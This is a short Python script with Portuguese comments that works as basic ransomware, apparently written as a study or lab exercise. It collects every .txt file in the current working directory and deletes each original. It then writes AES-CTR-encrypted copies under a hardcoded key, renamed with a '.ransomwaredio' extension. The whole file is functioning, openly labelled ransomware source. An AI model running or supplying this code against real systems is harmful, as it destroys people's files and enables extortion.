import os
import glob
import pyaes

## chave de criptografia
key = b'testeransomwares'

## Obtém o caminho completo para o diretório atual
diretorio = os.environ['PWD']

## Cria uma lista com os arquivos ".txt" no diretório atual
lista_arquivos = list(glob.iglob(f'{diretorio}/*.txt'))

## Processa cada um dos arquivos da lista
for nome_arquivo in lista_arquivos:
    ## Cria uma nova instância do pyaes
    aes = pyaes.AESModeOfOperationCTR(key)
    ## Lê os dados do arquivo original
    arquivo = open(nome_arquivo, "rb")
    dados = arquivo.read()
    arquivo.close()
    ## remove o arquivo original
    os.remove(nome_arquivo)
    ## criptografa os dados
    dados_encriptados = aes.encrypt(dados)
    ## Cria um novo arquivo com o conteúdo encriptado
    novo_nome = nome_arquivo + '.ransomwaredio'
    novo_arquivo = open(f'{novo_nome}','wb')
    novo_arquivo.write(dados_encriptados)
    novo_arquivo.close()
